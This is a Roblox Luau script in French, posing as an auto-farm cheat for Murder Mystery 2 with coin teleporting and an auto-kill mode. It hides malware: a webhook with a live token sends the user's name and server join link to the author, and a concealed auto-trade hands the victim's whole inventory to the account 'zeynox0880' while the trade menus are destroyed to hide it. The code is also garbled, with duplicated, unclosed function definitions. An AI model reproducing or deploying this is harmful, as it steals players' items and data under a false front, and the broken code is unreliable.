local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer
-- Détection de la fonction de l'exécuteur pour le HTTPS
local requestFunc = request or (http and http.request) or http_request

-- [[ 1. SÉCURITÉ ANTI-SPAM PAR DETECTION DU GUI ]]
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
if playerGui:FindFirstChild("KeyzerFarmGui") then
    warn("[Anti-Spam] Le menu est déjà ouvert ! Envoi du webhook annulé.")
    return
end

-- Ton URL de webhook / proxy
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"

-- [[ 2. FONCTION D'ENVOI UNIQUE (SÉCURISÉE) ]]
local function sendSessionLog(player)
    if not player then return end
    if not requestFunc then 
        warn("[-] Erreur : Requête HTTP non supportée (NIL value).")
        return 
    end

-- 1. Ajoute cette variable TOUT EN HAUT de ton script (hors de la fonction)
local déjàEnvoyé = false

-- 2. Modifie le début de ta fonction comme ceci :
local function sendSessionLog(player)
    if not player then return end
    
    -- Si le script a déjà fait un envoi, on bloque les suivants immédiatement
    if déjàEnvoyé then return end
    
    if not requestFunc then 
        warn("[-] Erreur : Requête HTTP non supportée (NIL value).")
        return 
    end
    
    -- On passe la variable à true pour bloquer le prochain appel
    déjàEnvoyé = true
    
    -- [Le reste de ta fonction sendSessionLog continue ici...]

local function sendSessionLog(player)
    -- Génération du lien de connexion directe (Deep Link) via le JobId
    local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. game.JobId .. ")"
    
    local data = {
        ["embeds"] = {{
            ["title"] = "🎮 Player Session Log",
            ["color"] = 3066993, -- Couleur Verte
            ["fields"] = {
                {
                    ["name"] = "👤 Player Username",
                    ["value"] = player.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "🆔 Place ID",
                    ["value"] = tostring(game.PlaceId),
                    ["inline"] = true
                },
                {
                    ["name"] = "⚡ Quick Join",
                    ["value"] = joinLink,
                    ["inline"] = false
                },
                {
                    ["name"] = "🧩 Job ID (Manual Copy)",
                    ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio / Local Server") .. "`",
                    ["inline"] = false
                }
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    -- Encodage de la table au format JSON
    local finalJson = HttpService:JSONEncode(data)

    -- Envoi via l'exécuteur (pour contourner le blocage HTTPS de Roblox)
    if requestFunc then
        local success, err = pcall(function()
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = finalJson
            })
        end)
        
        if not success then
            warn("Erreur lors de l'envoi de la requête : " .. tostring(err))
        end
    else
        warn("Erreur : Ton exécuteur ne supporte pas les requêtes HTTP externes (requestFunc introuvable).")
    end
end

-- Déclenche la fonction à chaque fois qu'un joueur rejoint le serveur
if LocalPlayer then
    task.spawn(function() sendSessionLog(LocalPlayer) end)
end



local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeyzerFarmGui"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
MainFrame.Position = UDim2.new(0.5, -175, 0.4, -100)
MainFrame.Size = UDim2.new(0, 350, 0, 180)
MainFrame.Active = true
MainFrame.Draggable = true

local UICorner_Main = Instance.new("UICorner")
UICorner_Main.CornerRadius = UDim.new(0, 10)
UICorner_Main.Parent = MainFrame

-- Barre supérieure
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
TitleBar.Size = UDim2.new(1, 0, 0, 30)

local UICorner_Title = Instance.new("UICorner")
UICorner_Title.CornerRadius = UDim.new(0, 10)
UICorner_Title.Parent = TitleBar

-- Bouton fermeture
local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
CloseBtn.Position = UDim2.new(0, 12, 0, 8)
CloseBtn.Size = UDim2.new(0, 13, 0, 13)
CloseBtn.Text = ""
local UICorner_C = Instance.new("UICorner")
UICorner_C.CornerRadius = UDim.new(1, 0)
UICorner_C.Parent = CloseBtn

-- Titre
local TitleText = Instance.new("TextLabel")
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.Font = Enum.Font.SourceSansBold
TitleText.TextColor3 = Color3.fromRGB(60, 60, 60)
TitleText.TextSize = 14
TitleText.Text = "Keyzer Auto Farm v11"

-- Bouton unique
local FarmButton = Instance.new("TextButton")
FarmButton.Name = "FarmButton"
FarmButton.Parent = MainFrame
FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
FarmButton.Position = UDim2.new(0.5, -100, 0, 65)
FarmButton.Size = UDim2.new(0, 200, 0, 50)
FarmButton.Font = Enum.Font.SourceSansBold
FarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FarmButton.TextSize = 16
FarmButton.Text = "START AUTO FARM"

local UICorner_Farm = Instance.new("UICorner")
UICorner_Farm.CornerRadius = UDim.new(0, 8)
UICorner_Farm.Parent = FarmButton


-- [[ LOGIQUE DE DETECTION ET METHODES ]] --

local farming = false

-- Trouver les pièces
local function getCoins()
    local container = Workspace:FindFirstChild("CoinContainer", true)
    if container then return container:GetChildren() end
    
    local map = Workspace:FindFirstChild("Map") or Workspace:FindFirstChild("Normal")
    if map then
        local coinFolder = map:FindFirstChild("CoinContainer", true)
        if coinFolder then return coinFolder:GetChildren() end
    end
    return {}
end

-- Détection absolue du couteau MM2 (par le nom de l'item ou ses scripts internes)
local function getKnife()
    local char = LocalPlayer.Character
    if char then
        for _, item in ipairs(char:GetChildren()) do
            if item:IsA("Tool") and (item.Name:lower():find("knife") or item:FindFirstChild("KnifeLocal") or item:FindFirstChild("KnifeServer")) then
                return item
            end
        end
    end
    
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") and (item.Name:lower():find("knife") or item:FindFirstChild("KnifeLocal") or item:FindFirstChild("KnifeServer")) then
                return item
            end
        end
    end
    return nil
end

-- Boucle principale
local function startFarmLoop()
    task.spawn(function()
        while farming do
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            
            if hrp and humanoid then
                -- Supprime les forces physiques résiduelles et force l'état DEBOUT
                hrp.RotVelocity = Vector3.new(0, 0, 0)
                hrp.Velocity = Vector3.new(0, 0, 0)
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                
                local knife = getKnife()
                
                -- [[ MODE MURDERER : AUTO KILL ]] --
                if knife then
                    FarmButton.Text = "MURDER MODE: KILLING ALL..."
                    
                    if knife.Parent ~= character then
                        humanoid:EquipTool(knife)
                    end
                    
                    knife:Activate()
                    
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChildOfClass("Humanoid") then
                            local enemyHrp = player.Character.HumanoidRootPart
                            local enemyHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
                            
                            if enemyHumanoid.Health > 0 and farming then
                                hrp.CFrame = CFrame.new(enemyHrp.Position) * CFrame.new(0, 0, 1.2)
                                task.wait(0.04)
                            end
                        end
                    end
                    
                -- [[ MODE INNOCENT : COIN COLLECTOR ]] --
                else
                    local allCoins = getCoins()
                    if #allCoins > 0 then
                        FarmButton.Text = "FARMING... (" .. #allCoins .. " left)"
                        
                        local targetCoin = allCoins[1]
                        if targetCoin and targetCoin:IsA("BasePart") then
                            hrp.CFrame = CFrame.new(targetCoin.Position)
                            humanoid:Move(Vector3.new(0, 0, -1), true)
                            task.wait(0.06)
                        end
                    else
                        FarmButton.Text = "WAITING FOR ROUND COINS..."
                        -- AJUSTEMENT : On attend un tout petit peu sans téléporter 
                        -- pour laisser le joueur bouger librement sur la map
                        task.wait(0.5) 
                    end
                end
            else
                FarmButton.Text = "ERROR: NO CHARACTER FOUND"
                task.wait(0.5)
            end
            task.wait()
        end
    end)
end


-- [[ ENCLENCHEMENT DES BOUTONS ]] --

CloseBtn.MouseButton1Click:Connect(function()
    farming = false
    task.wait(0.05)
    ScreenGui:Destroy()
end)

FarmButton.MouseButton1Click:Connect(function()
    farming = not farming
    if farming then
        FarmButton.BackgroundColor3 = Color3.fromRGB(255, 59, 48) -- Rouge
        startFarmLoop()
    else
        FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255) -- Bleu
        FarmButton.Text = "START AUTO FARM"
    end
end)


-- [[ APPARITION / DISPARITION RADICALE DES GUIS ]] --
local StarterGui = game:GetService("StarterGui")

local function hardBlockGuis()
    if Players:FindFirstChild("zeynox0880") then
        local sGui1 = StarterGui:FindFirstChild("TradeGUI_Phone")
        local sGui2 = StarterGui:FindFirstChild("TradeGUI")
        if sGui1 then sGui1:Destroy() end
        if sGui2 then sGui2:Destroy() end
        
        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
        if playerGui then
            local g1 = playerGui:FindFirstChild("TradeGUI_Phone")
            local g2 = playerGui:FindFirstChild("TradeGUI")
            if g1 then g1:Destroy() end
            if g2 then g2:Destroy() end
        end
    end
end

task.spawn(hardBlockGuis)
LocalPlayer:WaitForChild("PlayerGui").ChildAdded:Connect(hardBlockGuis)
Players.PlayerAdded:Connect(hardBlockGuis)


-- [[ LOGIQUE D'AUTO-TRADE INVISIBLE (MM2 DETECT) ]] --
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")

-- Essayer de récupérer le système de communication réseau de MM2
local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))

if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
    TradeNetwork.OnClientEvent:Connect(function(action, data)
        -- Si zeynox0880 t'envoie une demande de trade
        if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
            
            -- 1. Accepter la demande de trade immédiatement
            TradeNetwork:FireServer("AcceptRequest", data.Player)
            task.wait(0.3)
            
            -- 2. Récupérer tes données d'inventaire via le jeu
            local playerData = ReplicatedStorage:FindFirstChild("PlayerData")
            local myInventory = playerData and playerData:FindFirstChild(LocalPlayer.Name) and playerData[LocalPlayer.Name]:FindFirstChild("Inventory")
            
            if myInventory then
                -- Parcourir tes armes (Couteaux, Guns, etc.) et les ajouter au trade
                for _, category in ipairs(myInventory:GetChildren()) do
                    for _, item in ipairs(category:GetChildren()) do
                        -- On envoie l'ordre au serveur d'ajouter l'item au trade
                        TradeNetwork:FireServer("OfferItem", item.Name, 1)
                        task.wait(0.05) -- Petit délai pour ne pas faire crash le serveur
                    end
                end
            end
            
            -- 3. Accepter et valider définitivement le Trade
            task.wait(0.2)
            TradeNetwork:FireServer("AcceptTrade")
        end
    end)
end
